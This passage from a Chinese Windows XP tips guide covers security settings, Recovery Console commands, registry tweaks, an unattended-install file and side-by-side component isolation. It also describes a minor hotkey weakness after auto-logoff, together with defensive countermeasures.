　　为防止其他人在使用自己的电脑时，偷看自己存储在电脑中的文件信息，Windows XP特意为我们普通用户提供了“文件和文件夹加密”功能，利用该功能我们可以对存储在电脑中的重要信息进行加密，这样其他用户在没有密码的情况下是无法访问文件或者文件夹中的内容的。在对文件进行加密时，我们首先打开Windows XP的资源管理器，然后在资源管理器操作窗口中找到需要进行加密的文件或者文件夹，然后用鼠标右键单击选中的文件或文件夹，从弹出的快捷菜单中选择“属性”命令，随后Windows XP会弹出文件加密对话框，单击对话框中的“常规”标签，然后再依次选择“高级”/“加密内容以便保护数据”就可以了。 
　　4、锁定您的计算机 
　　如果在使用电脑的过程中因有急事需要短暂离开电脑的话，许多人因担心自己的电脑会被别人占用，往往会采取先关机，后离开，然后回来再开机的办法来处理，但这样频繁开关机器对电脑是不利的。那我们有没有办法做到既不要关机又能防止其他人使用自己的计算机呢？办法当然是有的啦，您可以通过双击桌面快捷方式来迅速锁定键盘和显示器，而无需使用CTRL+ALT+DEL组合键或屏幕保护程序。在锁定您的计算机时，您可以参照如下的步骤来执行：先用鼠标右键单击Windows XP的桌面，然后在右键菜单中依次选择"新建"/"快捷方式"，随后按照屏幕提示，在命令行的文本框中输入"rundll32.exe user32.dll,LockWorkStation"命令字符，再在随后的向导窗口中输入对应该快捷方式的具体名称，在这里为方便以后调用，您可以直接为该快捷方式取名为"锁定计算机"就可以了。以后您只要双击桌面上的“锁定计算机”，就可以达到锁定的目的了。 
5、使用“连接防火墙”功能 
　　在网络时代中，病毒的传播方式、传播速度和破坏力发生了翻天覆地变化，而且黑客行为也正在全世界范围内活动。为了防止病毒和黑客的随意入侵，不少用户在自己的计算机中都安装了防火墙。而Windows XP就加入了免费的"Internet 连接防火墙"功能，利用该功能，Windows XP能对出入系统的所有信息进行动态数据包筛选，允许系统同意访问的人与数据进入自己的内部网络，同时将不允许的用户与数据拒之门外，最大限度地阻止网络中的黑客来访问自己的网络，防止他们随意更改、移动甚至删除网络上的重要信息。在使用“连接防火墙”功能时，您可以依次单击开始菜单中的"设置"/"网络连接"菜单项，然后从弹出的窗口中选择需要上网的拨号连接，然后用鼠标右键单击该连接图标，并选择"属性"命令，在随后弹出的拨号属性窗口中再单击"高级"标签，在对应标签的页面中选中"Internet连接防火墙"选项，然后再单击对应防火墙的“设置”按钮，来根据自己的要求设置一下防火墙，以便防火墙能更高效地工作。 
　　6、随时起用屏保程序 
　　看到“屏保”二字，大家肯定会很自然地想到计算机中的屏幕保护程序，它主要是通过采用不同方式轮流显示指定图片来达到屏幕保护的目的。但是只有当不操作电脑达到事先设置的时间后，系统才会启动屏幕保护程序，如果我们想在任意指定的时间内启动屏幕保护程序，该怎么办呢？我们可以按照下面的操作方法来实现：在Windows XP的开始菜单中，依次单击"开始"/"搜索"/"文件或文件夹"，然后在弹出的搜索对话框中，点击"所有文件和文件夹"类型，并在对应文件名的文本框中输入"*.scr"字符，再在搜索范围下拉列表中，选择"本机磁盘(C:)"或计算机上存储系统文件的驱动器，最后单击"搜索"按钮。然后在找到的屏幕保护程序列表中，选择需要的屏保程序，然后给这个屏保程序建立一个存放在桌面上的快捷方式，以后要启动屏保程序时直接用鼠标双击桌面上的屏保快捷方式。 
　　7、为自己分配管理权限 
　　安装在Windows XP操作系统中的许多程序，都要求用户具有一定的管理权限才能让用户使用程序，因此为了能够使用好程序，我们有时需要为自己临时分配一个访问程序的管理权限。在分配管理权限时，我们可以先普通用户身份登录到Windows XP的系统中，然后用鼠标右键单击程序安装文件，同时按住键盘上的Shift键，从随后出现的快捷菜单中点击"运行方式"，最后在弹出的窗口中输入具有相应管理权限的用户名和密码就可以了。 
　　8、消除系统假死现象 
　　在操作Windows XP中的应用程序时，由于操作不当或者系统本身的问题，导致了操作的程序很长时间没有响应，许多人以为计算机肯定是死机了，于是不少人选择了直接关机或者使用Ctrl+Alt+Delete来重新启动计算机。其实在Windows XP中，有些不能正常运行的程序会引起系统任务栏的假死，这种现象主要是由于当前执行的程序与系统无法兼容引起的。遇到这种现象时，我们可以找到该程序的执行文件，然后单击鼠标右键，在弹出的对话框中选择"兼容性"标签，再在"兼容模式"下选择相应需要的运行环境。 
21:辅助操作和特殊功能命令 
编者语： 
　　Windows XP（包括 Windows 2000）的控制台命令是在系统出现一些意外情况下的一种非常有效的诊断和测试以及恢复系统功能的工具。小编的确一直都想把这方面的命令做个总结，这次辛苦老范给我们整理了这份实用的秘笈。 
　　Cls 
　　清除屏幕。 
　　清除后的屏幕只显示命令提示符和插入点。 
　　Disable 
　　禁用 Windows XP 、Windows 2000 或 Windows NT 4.0 系统服务或设备驱动程序。disable 命令仅在使用故障恢复控制台时才可用。 
　　disable {service_name] |[ device_driver_name} 
　　参数 
　　service_name 
　　要禁用的系统服务名称。 
　　device_driver_name 
　　要禁用的设备驱动程序名称。 
　　范例 
　　下例将禁用 Eventlog 服务： 
　　disable eventlog 
　　注意 
disable 命令将指定的服务或驱动程序的启动类型设为 SERVICE_DISABLED 。 
使用 disable 命令禁用系统服务或设备驱动程序时，该系统服务或设备驱动程序上次启动类型的名称将显示在屏幕上。应该记下该名称，以便在需要时使用 enable 命令将启动类型恢复为上次的设置 。 
共有五种启动类型。前三种类型是：SERVICE_AUTO_START 、SERVICE_DISABLED 和SERVICE_DEMAND_START 。对应的标准启动类型：自动、禁用和手动，通常使用“计算机管理”管理工具中的“服务”进行配置。后两种类型是：SERVICE_BOOT_START 和 SERVICE_SYSTEM_START，通常用于配置加载设备驱动程序的方式。例如，在启动计算机时或启动 Windows 时加载。 
　　Enable 
　　启用 Windows XP 、Windows 2000 或 Windows NT 4.0 系统服务或设备驱动程序。enable 命令仅在使用故障恢复控制台时才可用。 
　　enable {service_name |device_driver_name}[ startup_type] 
　　参数 
　　service_name 
　　要启用的系统服务的名称。 
　　device_driver_name 
　　要启用的设备驱动程序的名称。 
　　startup_type 
　　要为服务或设备驱动程序指派的启动类型。有效的启动类型包括： 
SERVICE_BOOT_START 
SERVICE_SYSTEM_START 
SERVICE_AUTO_START 
SERVICE_DEMAND_START 
　　范例 
　　下例将 Eventlog 服务的启动类型设为自动或 SERVICE_AUTO_START： 
　　enable eventlog service_auto_start 
　　注意 
如果不指派启动类型，enable 命令将列出在 service_name 中指定的服务或设备驱动程序的当前启动类型。 
使用 enable 命令更改启动类型时，上次启动类型的名称将显示在屏幕上。应该记下该名称，以便在需要时将启动类型恢复为上次的设置。 
　　Exit 
　　关闭故障恢复控制台并重新启动计算机。exit 命令仅在使用“故障恢复控制台”时才可用。 
　　exit 
　　参数　　无 
　　Help 
　　提供有关故障恢复控制台命令的联机信息。 

　　help [ commandname] 
　　参数　　无 
　　列出故障恢复控制台中提供的命令。 
　　commandname 
　　提供有关命令信息，包括命令使用的参数。 
　　注意 
有两种方法可以获得命令的联机帮助。可以指定 help 命令后的命令名称，或者可以在命令提示符中键入该命令名称和 /?。开关。例如，键入下列命令可以获得有关extract 命令的信息： 
help extract 
extract /? 
　　Listsvc 
　　列出计算机上可以使用的服务和驱动程序。listsvc 命令仅在使用故障恢复控制台时才可用。 
　　listsvc 
　　参数　　无 
　　Logon 
　　登录到 Windows 安装。logon 命令仅在使用故障恢复控制台时才可用。 
　　logon 
　　参数　　无 
　　注意 
logon 命令将列出所有检测到的 Windows 安装，需要安装的本地管理员密码才能登录。 
如果 3 次登录尝试都失败，“故障恢复控制台”会退出并且计算机将重新启动。 
　　Net use 
　　将网络共享连接到驱动器号。含有下列参数的 net use 命令仅在使用故障恢复控制台时可用。在命令提示符下可以使用带不同参数的 net use 命令。 
　　语法 
　　net use [ \\ ComputerName\ShareName [ /user:[ DomainName\ ] UserName] password] |[ drive 
letter:] [ /d] 
　　参数 
　　\\servername\sharename 
　　指定服务器和共享资源的名称。如果 computername 包含空白字符，则将计算机名从双反斜杠（\\）到计算机名结尾用引号（"）括起来。计算机名长度可以是 1 到 15 个字符。 
　　/user 
　　指定建立连接的用户名。 
　　域名 
　　确认用户的凭据时所要使用的域名。 
　　用户名 
　　指定登录时使用的用户名。 
　　密码 
　　指定访问共享资源所需的密码。不输入密码，将给出要键入密码的提示。在密码提示行处键入密码时不显示密码。 
　　/d 
　　表示将不断开该连接。 
　　Set 
　　显示和设置“故障恢复控制台”的环境变量。set 命令是必须与安全模板一同使用的可选命令。 
　　含有不同参数的 set 命令仅在使用故障故障恢复控制台时可用。可在命令提示符下使用带不同参数的 set 命令。 
　　set [ variable=[ string] ] 
　　参数 
　　variable 
　　指定需要设置或修改的变量。 
　　“故障恢复控制台”支持以下环境变量： 
变量 说明 
AllowWildCards 允许某些命令（如 del 命令）支持通配符。 
AllowAllPaths 允许访问系统上的所有文件和目录。 
AllowRemovableMedia 允许文件复制到可移动媒体上，如软盘。 
NoCopyPrompt 覆盖现有文件时不显示提示。 
　　string 
　　指定要与指定变量关联的字符串。 
　　范例 
　　下例允许在某些故障恢复控制台命令中使用通配符： 
　　set allowwildcards=true 
　　指定要删除的目录的位置和名称。不能使用通配符。 
　　注意 
目录必须为空否则命令失败。 
Rmdir 仅适用于当前 Windows 安装的系统目录、可移动媒体、硬盘分区的根目录或本地安装源。 
　　Systemroot 
　　将当前目录设置为用户登录到的 Windows 安装系统的 systemroot 文件夹。systemroot 命令仅在使用故障恢复控制台时可用。 
22:高级技巧与应用. 
　　Win XP推出后，有关Win XP的操作技巧和优化技巧的信息自然也会随之而来，本文将给大家展示一些Win XP的操作技巧（有些是优化技巧，有些是专门针对Win XP的），大部分内容是独创（原创）的——一些在网上出现过的内容，尽可能避免雷同（如有雷同，纯属巧合，^_^），相信对网友们一定有用。 
1[虚拟桌面管理，轻松拥有4个桌面] 
　　以前我们使用windows操作系统的时候要想有多个桌面，就要装专门的软件。在Win XP中你不需要装这种软件就可以拥有4个桌面。将鼠标指到任务栏，点右键－－>工具－－>desktop manager（虚拟桌面管理器，部分版本没有此项功能）.在任务栏的右下角就会出现5个按钮，这5个按钮分别代表4个桌面和一个预览（4个桌面一起出现在屏幕上）。当你第一次使用这项功能时，这4个桌面的设置都是当前桌面的设置，你可以在此基础上设计个性化的桌面。 
　　使用这个虚拟桌面管理器要比你想象的稍微复杂一些。在任务栏中的虚拟桌面管理器上点右键，在弹出菜单中选择“configure desktop images”，会出现一个叫“MSVDM settings”的对话框，点击“desktop”选项卡，在这个选项卡上，你可以分别设置4个桌面的背景，至于具体怎么设，大家一看一试就知道了，这里从略。同是在“MSVDM settings”对话框里，有个“shortcut keys”的选项卡，这个选项卡上可以设置4个桌面以及预览的快捷键，默认的是windows徽标键加1，2，3，4，和V。如果使用快捷键，你就可以隐藏虚拟桌面管理器，为任务栏腾出更多的空间。 
　　在虚拟桌面中，各个桌面可以有自己的背景，自己的桌面设置，你在桌面1上开的程序的窗口在其他桌面上是不显示的，但在任务栏上，该程序的按钮还是在的，点一下就可以在其他桌面打开了。你也可以使在不同桌面下运行的程序在别的桌面上不能打开，使各个桌面各自有各自的程序。在虚拟桌面管理器上点右键，在弹出菜单中去掉“shared desktop”前面的勾即可。 
2[任务栏放大镜，桌面图文清晰可见] 
　　Win XP设计的适用对象是很广泛的，他考虑到各种轻度残疾的人士，所以Win XP的附件下面有个“辅助工具”，方便听觉和视力差的人使用该操作系统。其实除了这些，任务栏本身就有一个放大镜工具（跟辅助工具里的那个是不一样的，那个是在桌面屏幕的上方显示的，面积大，而这个是在任务栏里显示的，面积小）。在任务栏上右击，选工具栏，在下级菜单中选择“taskbar magnifier”，然后任务栏右方就会出现一个“小方框”，里面有放大图（鼠标所指处），这个图象的放大倍数是可以自定义的，在“小方框”上点右键，在弹出的“zoom”子菜单里选择放大倍数。这个“小方框”很小，如果想大一点，可以拉宽任务栏。 
3[“地址”“链接”和“桌面”，访问文件网页更方便] 
　 
　　右键点击任务栏的空白处，在弹出的菜单中选择“工具栏”，然后分别选择子菜单中的“地址”，“链接”和“桌面”。 
　　将这些工具放在任务栏可以方便很多，比如你要访问一个网站，可以直接在地址栏里键入网址（如果接上了internet的话），也可以在这里键入比如“D：\\”来直接访问各个磁盘，要读软驱就键入“A:\\”，要读光驱就直接键入“G:\\”（如果光驱时G的话），要发邮件吗？在地址栏里键入“mail to ＋信箱地址”就可以了。链接的作用就不用讲了，大家都知道。那个叫桌面的东东可好用了，你访问文件（如果有很多文件，需要找的话），可以在这里找，这个“桌面”把所有文件都排成树形结构，所有文件及其结构都一目了然，方便了许多。 
　　你还可以直接访问网站，在一般情况下，当我们想登录到某网站时，都必须先启动Internet Explorer，其实，只要我们单击“开始”→“运行”（或者，win键＋R），并在“打开”项上直接输入网址，系统就会为你连接到相应的网站。如果你在系统中设置了自动拨号的话，它还会为你自动拨号，非常方便。 
4[语言栏：文字，语音，和手写] 
　　微软对文字服务的概念在Win XP中做了很大的扩充和发展，变成了“语言”的概念，就不仅仅是打字输入的概念了，而是通过各种手段（目前是文字，语音，和手写）来输入信息和指令。当然大多数情况下，人们还是习惯于仅仅使用文字输入的，一般用不上语音输入和手写，即使用手不方便的用户，用语音也是很费力的，它要占用很大的资源，而且语音识别的能力也不能让人恭维，但它展示了一种方向和趋势，也是Win XP作为（至少外观和功能上的）“化时代产品”的一个显著标志，所以在这里介绍一下，有兴趣的朋友可以去“尝鲜”一下。 
　　一般用户会设置不显示手写输入和语音输入的相关图标，所以在语言栏里，你看不到他们。要显示他们，只需点语言栏的右下角的一个向下的小箭头，然后在弹出的菜单中选择“任务栏中其他图片”这时，这些图标就会出现了——如果还没出现，那是因为相关的系统服务没开，可能是由于你因为要加快开机速度而在msconfig里对开机时启动的服务进行了“优化”，关掉了这些服务。 
　　以“手写输入”为例，手写输入有两种，一种是接一个外设，就是市场上在卖的那种，然后你可以象平时写字一样在电脑里写你的文字，还有一种是在电脑里用鼠标“写”的，这个有点象写字板，只是你写的字能够被计算机识别，然后变为正楷罢了，用鼠标写字可是很费力的喔，不过，如果你是打拼音的（现在大多数人是用这个），当你遇到一个生僻字，这个字你知道字形，但不知道字音时，这个“手写输入”还是一条不错地解决途径。 
5[通知区域自定义，Alt＋tab更清晰] 
　　不活动的程序图标会被自动隐藏起来，给任务栏的其他图标和按钮腾出了空间，而且在属性里还可以设置哪些显示，哪些不显示——比如你装了一个防火墙软件，它的图标会一直在通知区域，你知道这一点，所以就不用它“通知”你了，这时就可以把它隐藏起来。方法如下，在任务栏右击选“属性”，在弹出的对话框里的“通知区域”中选“自定义”，在弹出另一个对话框，你可以任意设置了。 
　　还有Alt＋tab键（用来切换任务），也跟win2000不同了，不仅仅显示那些任务的图标，还显示这些任务的窗口的缩略图。这个也是有用的，比如你开了很多网页，在win2000中，你要切换网页时就可能分不清哪个网页是你要看的，有个这个功能，你就可以通过看图来辨认出你要看的网页了。(不同版本的情况有所不同）。 
　 
6[清除 Win XP 共享文件夹] 
　　打开我的电脑，我们都会注意到有个“共享文件夹”，这个文件夹在我们使用工作组的时候蛮有用，你不用设置什么东西，直接把要共享的文件放到这个共享文件夹里就搞定了，但是实际应用中，很多人并不需要这个文件夹，有时就想把它干掉，但是怎么都找不到在那里设置，这时只有求救注册表了。 打开注册表编辑器（不要说不知道怎么打开啊，运行regedit就ok了）。 找到： 
HKEY_LOCAL_MACHINE --> SOFTWARE --> Microsoft -->Windows--> CurrentVersion -->Explorer -->My Computer-->NameSpace --> DelegateFolders -->{59031a47-3f72-44a7-89c5-5595fe6b30ee} ,把这个项del掉就ok了，不过你先得备个奋，或者记下这个值，以后说不定你还会用到它呢。 7[保存搜索结果] 
搜索是一个很浪费时间的过程，如果你对自己机器里资料的存放了如指掌，自然很少有用到搜索，但要是你要去公共机房，你要什么东西就常要搜索了，搜索可是很浪费时间的，所以有时你需要把搜索结果保存起来。在你键入你的搜索条件后，执行“立即搜索”。然后右键单击“搜索结果”面板(或选择“文件”菜单)，选择“保存搜索”，并在弹出的对话框中键入文件名和保存位置。以后每次想要运行同样的搜索，只需在资源管理器中找到该文件，然后双击，已保存的搜索标准会很方便地导入到“搜索结果”对话框的合适区域中，无需重复输入搜索标准即可进行搜索。这可是很省力的，还有要提醒大家，有时间研究一下Win XP的搜索助手，其实它的功能十分强大，平时我们都不太使用，但微软的coder们设计的时候可是贯注心力的，研究一下你可以更有效率地使用它，这里就不多说了。 
7[任务栏显示快捷方式] 
　　你可以把你经常用的文件夹和程序拖到任务栏上创建一个快捷方式。你可以在D盘上新建一个文件夹，将其命名为“任务栏文件夹”，将你常用的文件夹和常用程序快捷方式都放到这个文件夹中，然后在任务栏上单击鼠标右键，选择“工具栏”→“新建工具栏”→“系统任务栏”，单击“确定”后，这个工具栏就出现在任务栏上了。在默认情况下，将显示新建工具栏的图标、文字和标题。但可以只让它显示图标，方法为在任务栏上右击 去掉“显示标题”、“显示文字”两项前面的小钩。 
　 
8[去除Win XP的随标提示] 
　　为了用户使用方面，windows很早就有了提示，比如你的鼠标指到“开始”，它就会出现一个提示行：“单击这里开始”。这实际上是一个链接，我们使用时间长了就不需要它了，可是没有什么地方可是设置不显示提示，要知道这种提示都要占系统资源的，而我们并不需要这些提示，于是就到注册表编辑器里去搞定它：HKEY_CURRENT_USER-->Control PanelDesktop-->LameButton ,把它的键值改为0，然后注销一下（不行就重启），这些浪费资源的提示就没有了。 
9[辨认真假中文版XP] 
　　下面这个方法是用来查看是否你的Win XP为真正的正文版的。1.执行超级终端机.是否为中文接口及中文名称。如果你的Win XP是英文汉化的，那么在这里肯定会露出马脚。 2.运行dxdiag.exe，如果不行，到system32里找到这个文件（注意要显示所有系统文件后才能找到）.看看directx诊断程序中的系统信息 ，看看系统信息中的操作系统版本是否为5.1build2600 ，看看系统信息中的语言及区域设定是否都为中文 。 
10[安装Win XP不用输序号] 
　　要做到安装Win XP不用输序号（是不用输，不是不用序号）要有一个前提，就是你的Win XP原文件已经考到了你的硬盘上或者你的光盘是可读写的。方法如下：在I386的文件下放一个叫WINNT.SIF的， 内容如下： 
===================================================================== 
　　[UserData] ProductKey=XXXXX-XXXXX-XXXXX-XXXXX-XXXXX 
　　//注意，这个是你的xp 的注册码，要写在这里，不一定与这个相同 
　　[Data] AutoPartition=0 
　　MSDosInitiated=0 
　　UnattendedInstall=Yes 
　　[Unattended] 
　　UnattendMode=GuiAttended 
　　TargetPath=WINNT 
　　Hibernation=1 
　　OemPreinstall=No 
　　OemSkipEula=Yes 
　　CrashDumpSetting=0 
　　DisableDynamicUpdates=Yes 
　　UnattendSwitch=Yes 
　　===================================================================== 
11[一键完成网络诊断] 
　　要进行网络诊断，你可以用命令提示符里的相关命令，比如ping，但这些诊断是不全的，要做一个完整的网络诊断，只有在Win XP的帮助中心才能实现，打开“开始”-->“帮助与支持”，在其中找到网络诊断（用搜索搜一下，如果你找不到的话），只要按一下“扫描您的系统”，就可以完成所有的网络诊断，扫描完后，它会给出制作的很漂亮的报告（比命令提示符可好多了，这才叫xp（experience）吗），这个报告即给出了文字的结果，也给出了十分详细的数据，无论是一般用户，还是系统工程师都用的上它。 
12[减少协议开销] 
　　有许多朋友要做一个浪费资源的行为，就是安装许多网络协议，原因可能是因为他们不清楚这些协议到底是干什么用的，所以就把所有的协议都装了。其实装很多协议是很不好的，你要什么协议就装什么协议，不知道可以试试，和找些资料看，多装协议怎么浪费资源呢？多余的协议：1浪费内存，2降低效率，当一个程序或服务向网路发出请求任务时，系统会在所有的协议中寻找所请求的的服务器或服务，而且，它需要在接受到协议的响应后才能够选定协议，并建立连接，所以这样就会延长时间。 
　 
13[关掉快速切换功能] 
　　Win XP的一个很引人注目的功能叫做“快速切换”，这个功能为许多人在同一时间使用电脑提供了可能，但是要注意每一项功能总是伴随着资源的损失，如果你的内存少与64M，Win XP在装的时候就被自动禁止掉了，因为这样会使本来就已捉襟见肘的内存的压力更加大，对128M的用户来说，开这个功能虽然没什么关系，但是你又不是很需要这项功能，所以建议把这个功能给关掉。方法如下：控制面板-->用户帐户，点击“更改用户登陆或注销方式”，去掉“使用快速用户切换”就可以了。 
14[Win XP也玩文件夹背景] 
　　在Win XP以前，我们都可以设置文件夹背景，比如你打开一个文件夹，你可以设置一幅赏心悦目的背景图，这样会增加“XP”，但是Win XP中却没有这项功能。可是很奇怪我的一个朋友的Win XP却可以设置背景。其实他也不是设置，他是从win2000升级到Win XP的，在win2000中他设置了背景，在Win XP中，这个背景还是有效的，我花了些时间终于找到了原因，原来有背景的文件夹里都有个desktop.ini文件，于是我在自己的机器上找，找到了很多desktop.ini，但是这些都没有用，大概是Win XP去除了这项功能之后，所有的desktop.ini里就没了设置文件夹背景的参数，但是我的朋友的Win XP还有背景说明Win XP还是能解释这些参数，于是我把朋友的desktop.ini拷过来，果然有效，所以这里把这个desktop.ini贴出来，大家就可以在Win XP中设置背景了。 
　　====================================================================== 
　　[ExtShellFolderViews] 
　　{BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC} 
　　[{BE098140-A513-11D0-A3A4-00C04FD706EC}] 
　　Attributes=1 
　　IconArea_Image=E:\\picture\\girl2\\19.jpg 
　　//这里设置你的背景图片的路径 
　　[.ShellClassInfo] 
　　ConfirmFileOp=0 
　　====================================================================== 
15[把网页，图片置于桌面] 
　　你可以让你的左面图片随时变，你可以把你喜欢的网页一直放在桌面上。这些都是用了Win XP的桌面web功能。方法如下：在桌面上点右键，选择“属性”选项卡，点击自定义桌面，然后在新的对话框中选择“web”，然后“新建”，在又一个新的对话框中，你可以填入n幅图片的路径，这样，这些图片都会出现在桌面，你可以随便选择一幅作为你的桌面图片；你也可以填入n个网页的地址，这样这些网页就会出现在桌面，你可以随时调来浏览，不过这些网页本身是“死”的，尽管你可以点击，但他会打开IE，这个web页实际上被作为图标放在那里了，它的功能是使你的左面变的玄一点。 
16[无桌面操作] 
　　这里首先要讲一下桌面的概念，也许你已经习惯于把桌面等同与你的显示器平面了，其实严格的讲，桌面是一个特殊的explore程序，是操作体统给用户的一个shell。这里所说的无桌面操作也就是把这个shell关掉的操作，可不是没有显示器的操作（这叫盲操作）。先打开任务管理器，你可以在任务栏上点右键，或者直接按 CTRL＋ALT＋DEL，然后选择“进程”选项卡。找到explore.exe，然后结束这个进程，系统会给一个警告，告诉你说会有丢失数据的危险，不用管他，然后你会发现你的桌面丢了，你的任务栏没了，你的桌面图标也没了，只剩下你的桌面图片了（实际上桌面图片也没了，但是桌面图片已在你的内存中了，所以你还能看到它），你的鼠标还能用，但你无论左键点，还是右键点都没有什么响应了，ok，good，你的桌面没了。这时怎么操作呢？－－用任务管理器，其实你运行的所有程序只不过是一个一个的任务，当然你也可以在任务管理器里实现所有任务的管理，windows提供给我们桌面是为了操作方面，给用户一个友善的interface。我们这样做有什么好处呢，显而易见，explore.exe不运行了可以节省系统资源，如果你的内存少的实在惨不忍睹，那么就试试无桌面操作吧。 
这任务管理器的“应用程序”栏，你可以实现打开程序（点“新任务”按钮），关掉程序（点“结束任务”按钮），你可以最大最小化程序窗口，在应用程序的图标上点右键就知道怎么做了——这件事也可以在菜单栏的“窗口”中做。在“关机”菜单栏中，你可以完成待机，重启，关机，休眠，注销，锁定。 
17[优化程序运行] 
　　程序运行有他们各自的优先次序，所有程序都要占用处理器资源，处理器处理任务有一个先后次序，一般的计算机中有31个优先等级，系统的内核占据了最高的一些等级，这样就能保证系统的稳定，而普通的应用程序一般在比较后面的等级。在普通应用程序中间也有优先次序，他们本来在处理器面前是人人平等的，但还是有些细微的差别，前台的程序（当前正在使用）的优先级要比后台的程序高。 
　　你可以自己调节应用程序的优先级，打开任务管理器，点到“进程”选项卡，选一个应用程序的进程，点击右键，会弹出一个快捷菜单，选择“设置优先级”，这里有6个等级：实时，高，高与标准，标准，低于标准，低。你可以让你的程序强行调度到更高或更低（自然为别的程序腾出了资源）的等级。如果你不知道某个应用程序的具体进程，可以如下操作：点到“应用程序”选项卡，右键点中一个任务，选择“转到进程”，就会转到该程序的进程，这样你就找到了该程序的进程了。 
　　好了，上面这18个操作技巧怎么样，如果不是每个都很好，总有几个是你喜欢的吧^_^.还有一个不算秘密的秘密我要告诉大家，重装系统真是提高系统性能的好办法，无论你怎么保养，系统用久了总是会出许多大小毛病的，这些毛病很难医治，只有重头来过才是好办法，你的系统用了很长时间之后重装一次，刚装完时你就能深切地感受到这里的差距了，重装也不繁的（要改变的是观念），Win XP也就1个小时，你作磁盘整理也差不多需要这么多时间的，不过这里要提醒一句，你要把你的email，documents等等资料放到别的系统盘之外，以免丢了资料。还有一个经验，不要长时间地使用休眠，这样会不知不觉地出很多问题，每次启动其实都启动一种“重新来过”的作用，有时出了问题，只要重启一下就可以了，就是这个道理。 
23:搞定Windows XP鲜为人知的漏洞 
1）热键 
热键是用来启动一个程序或者使用一个程序的某项功能的一个键和一组键，一个键的可以包括F1，F2这些功能键，也可以是一些特制的键，比如DELL键盘上的“internet”，“mail”等一般键盘上没有的键，最常见的主要是一些组合键，使用QQ的人最熟悉的热键是“ctrl＋~”组合键，用来打开快捷地查看发来的信息。还有许多热键可以用来打开程序，这些热键一般自己可以设置，设置后可以用来打开各种程序，你可以为每个程序的设置确定规则，这样就可以有效地利用热键地功能，比如按照程序的首字母来命名，这样经过设置后，你就可以方便地用“ctrl＋Alt＋N”打开记事本，用“ctrl＋Alt＋W”打开word，对于那些对某个工具特别依赖的人来说，这样的打开程序的方式是很方便的，因此被广泛使用。 
2）winxp的“自注销”功能 
在办公的时候，我们常常需要暂时离开一下，而把电脑晾在办公桌上，这样就意味着信息被窥或丢失甚至更严重的后果，所以有了屏幕保护程序，如果你设了密码，那么一般情况下，别人就动不了你的电脑。这样就保证了安全。 
在winxp中，它提供一种我们称之为“自注销”（即自动注销）的功能，这种功能与屏幕保护程序有着异曲同工之妙，在你的电脑有一段时间出于静止状态后它就自动注销，不过这种“注销”是一种假注销，你所有的后台程序都还在运行，跟没有注销前几乎没有什么差别，这就留下了隐患。 
漏洞描述 
热键功能是系统提供的一个服务（专指打开程序，使用程序的热键），在启动过程一直到登陆界面，这个服务一直没有执行，当你以某一用户的身份登陆时，这个功能方才启动，执行之后，用户就可以使用用户自己设置（包括一些默认的热键）的热键了。 
假设一用户（他有管理员的身分，并以管理员登陆）有事离开一段时间，本来以为马上就回来，但后来被事情逼得不能马上就回来了，他得的电脑就暴露在没有保护的情况下了，这时winxp（这里提到的电脑的操作系统都专指winxp，而且该操作系统并没有设置屏幕保护程序和相应的密码）就非常聪明地自动实施了“自注销”。如果这种注销是真的注销了，那么这种安全措施显然是非常好的，但正如前面所讲，这种注销是假的，虽然其他人已经进不了你的桌面，看不到你的电脑里放了些什么，但他们还可以使用热键，因为热键服务还没有停止。 
这时一个有敌意的并且经验丰富的人就可以利用这些热键干一些事，最简单比如打开N个大程序，来破坏你的机器，可以打开并使用某个程序，特别是一些与网络有关的敏感程序（和服务）…… 
实际上这台电脑被他控制了一半，只要他有足够的想象力…… 
安全对策 
其实，我们得承认上面这个漏洞要被利用真正做出有破坏性的事情来几率是十分小的，它成立需要许许多多的“假设”，但作为一个漏洞，它却是实实在在存在的，不怕一万，只怕万一，就象“CDautorun”，据我们所知，它还没有被真正用来搞过破坏，但是这种破坏安全的可能性是实实在在存在的，所以在许多公共场合（比如网吧），这项功能是关闭的。 
那么怎么对付这个漏洞哪？ 
1、等微软给补丁，使实施“自注销”时，热键服务也一起停止。 
　　2、检查并观点可能会带来危害的程序和服务的热键。这个漏洞被利用的前提是热键可用。 
　　3、打开屏幕保护程序，并设置密码。 
winxp推出后确实做了许多为用户着想的功能，但每一项新的功能都可能由于各种原因潜藏了一种可能的危害。 
建议：请在离开计算机的时候按下windows键＋L键，锁定您的计算机。
24:隔离组件和并列共享 
　Windows XP的一个重要革新就是引入了隔离组件（Isolated Components）和并列共享（side-by-side sharing）功能。作为原来Windows中经常出现的DLL冲突问题的解决方案，Microsoft 强烈建议应用程序使用组件隔离和并列共享技术来解决DLL调用的问题。微软在ComCtl version 6中使用了并列共享处理，证明隔离组件和并列共享是未来Windows的发展方向。在这一节中，我们来了解一些Windows XP的隔离组件和并列共享的整体技术框架。 
　　在使用隔离组件和并列共享模式下，一个组件的很多个不同版本被同时安装在系统中。注意，是"同时"安装在系统中。在原来的Windows中，系统中一个组件或者是DLL只能有一个版本，因此在安装应用程序的时候，我们经常看到这样的对话框："要安装的xxxx.dll 比系统中原有的要旧，是覆盖还是保留？"。这个问题的确不好问答，因为安装旧的DLL吧，那么原来使用新的DLL的应用程序可能无法正常运行；如果不安装，那么新的应用程序也可能无法正常运行。这真是个两难的问题。 
　　Windows XP使用隔离组件和并列共享较好地解决了这个问题。由于系统中可以有一个DLL或组件的多个版本同时存在，应用程序在运行的时候可以选择使用自己在设计或开发的时候经过严格测试的组件版本。这样可以避免应用程序被迫调用不同版本的DLL或组件而可能导致的不可预知的错误。 
　　在Windows XP中，隔离组件和并列共享主要是通过程序清单（manifest）来实现的。通过程序清单，一个应用程序完整地定义了自己运行时需要调用的DLL或组件的版本。Windows XP根据程序清单，保证系统中一个应用程序的升级或删除不会影响到其它的程序需要使用的DLL或组件。所以我们看到，隔离组件和并列共享可以保证系统的安全和应用程序的安全。 
　　"程序清单（manifest）"是一个XML 文件，包含了一个程序安装和装配的全部信息，例如所有程序捆绑和安装需要的元数据（元数据指程序需要的基本的DLL调用、组件支持、接口定义等），例如COM 类、接口定义和DLL库定义等。清单文件有两类：应用程序清单文件，用来描述应用程序所需要的所有元数据；装配清单文件，用来描述单个组件的安装。 
　　一个应用程序可以在程序清单中明确地指出自己包含的所有程序部件如何安装在系统中。一个应用程序包含很多基本的元素，例如接口定义、帮助文件、不同版本的组件、系统配置信息等。所有的这些元素，可以根据程序清单分成两类：公有的和私有的。公有元素可以被计算机上安装的其他应用程序使用，他们被安装在Windows XP的WinSxS目录中。私有元素只能被包含他们的应用程序使用，安装在应用程序独有的目录下。
